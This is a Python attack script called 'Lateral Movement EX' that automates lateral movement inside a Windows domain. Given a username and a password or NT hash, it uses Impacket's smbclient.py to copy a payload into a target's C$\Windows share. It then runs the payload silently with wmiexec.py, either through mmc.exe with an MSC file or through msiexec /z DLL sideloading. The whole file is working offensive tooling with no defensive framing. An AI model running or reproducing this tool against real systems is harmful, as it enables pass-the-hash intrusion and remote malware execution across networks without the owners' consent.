#!/usr/bin/env python3

import subprocess
import os
from rich.console import Console
import argparse

console = Console()

parser = argparse.ArgumentParser(
                    prog='Lateral Movement EX',
                    description='Automates lateral movement with smbclient and wmiexec',
                    epilog='Please visit HexRav3n for more info')
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=False)
parser.add_argument('-n','--nthash', help='nthash value to set', required=False)
parser.add_argument('-d','--domain', help='Domain value to set', required=True)
parser.add_argument('-t','--target', help='Target', required=True)
parser.add_argument('-l','--payload', help='Payload', required=True)
parser.add_argument('-e','--technique', help='Technique to use, either MSC or DLL for msiexec DLL sideload', required=True)
args = parser.parse_args()



def upload_file(payload, target, domain, user, nthash, password):
    console.log(f"[white] [+] Uploading payload: {payload} to {target}")
    if nthash:        
        smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}@{target} -hashes :{nthash} -no-pass -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    else:
        smbclient = subprocess.Popen(f"smbclient.py {domain}/{user}:{password}@{target} -inputfile smbcommands.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    stdout, stderr = smbclient.communicate()

    print(stdout.decode(), stderr.decode())

def execute_payload(payload, target, domain, user, nthash, technique, password):
    console.log(f"[white] [+] Executing payload: {payload} on {target}")
    if technique == "MSC":
        if nthash:
            wmiexec = subprocess.Popen(
                f"wmiexec.py -silentcommand -nooutput -hashes :{nthash} -no-pass {domain}/{user}@{target} \"cmd.exe /c mmc.exe C:\\Windows\\{payload}\"",
                shell=True
            )
        else:
            wmiexec = subprocess.Popen(
                f"wmiexec.py -silentcommand -nooutput {domain}/{user}:{password}@{target} \"cmd.exe /c mmc.exe C:\\Windows\\{payload}\"",
                shell=True
            )
    elif technique == "DLL":
        if nthash:
            wmiexec = subprocess.Popen(
                f"wmiexec.py -silentcommand -nooutput -hashes :{nthash} -no-pass {domain}/{user}@{target} \"C:\\Windows\\System32\\msiexec.exe /z \\\"C:\\Windows\\{payload}\\\"\"",
                shell=True
            )
        else:
            wmiexec = subprocess.Popen(
                f"wmiexec.py -silentcommand -nooutput {domain}/{user}:{password}@{target} \"C:\\Windows\\System32\\msiexec.exe /z \\\"C:\\Windows\\{payload}\\\"\"",
                shell=True
            )


    stdout, stderr = wmiexec.communicate()

    if stdout:
       print(stdout.decode())

    if stderr:
       print(stderr.decode())

if __name__ == "__main__":
    console.log("[red] [+] Lateral Movement EX")

    user = args.user
    password = args.password
    nthash = args.nthash
    domain = args.domain
    target = args.target
    payload = args.payload
    technique = args.technique
    
    smb_commands = ["use C$\n", "cd Windows\n", f"put {payload}\n"]

    if os.path.exists("smbcommands.txt"):
        os.remove("smbcommands.txt")

    console.log("[white] [+] Generating smbcommands file")
    with open("smbcommands.txt", "w") as file:
        file.writelines(smb_commands)

    upload_file(payload, target, domain, user, nthash, password)

    execute_payload(payload, target, domain, user, nthash, technique, password)

    console.log("[green] [+] Payload execution complete!")

    console.log("[white] [+] Cleaning up....")

    os.remove("smbcommands.txt")

    







